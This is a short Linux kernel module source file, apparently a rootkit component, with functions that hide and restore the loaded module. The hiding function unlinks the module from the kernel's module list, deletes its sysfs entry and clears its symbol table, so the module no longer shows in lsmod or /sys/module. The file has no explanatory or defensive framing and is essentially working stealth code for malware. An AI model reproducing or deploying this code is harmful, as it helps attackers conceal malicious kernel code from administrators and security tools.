#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>

static struct list_head original_list;
static struct kobject *original_kobj;
static struct kobject *original_parent;
static struct mod_kallsyms *original_kallsyms;
static int is_hidden = 0;

static void __maybe_unused hidem(void)
{
   if (is_hidden)
       return;
   original_list = THIS_MODULE->list;
   list_del_init(&THIS_MODULE->list);
   original_kobj = &THIS_MODULE->mkobj.kobj;
   original_parent = original_kobj->parent;
   kobject_del(original_kobj);
   original_kallsyms = THIS_MODULE->kallsyms;
   THIS_MODULE->kallsyms = NULL;
   is_hidden = 1;
}

static void __maybe_unused showm(void)
{
   int ret;
   if (!is_hidden)
       return;
   list_add(&THIS_MODULE->list, original_list.prev);
   ret = kobject_add(original_kobj, original_parent, "%s", THIS_MODULE->name);
   if (ret)
       pr_err("kobject_add failed: %d\n", ret);
   THIS_MODULE->kallsyms = original_kallsyms;
   is_hidden = 0;
}
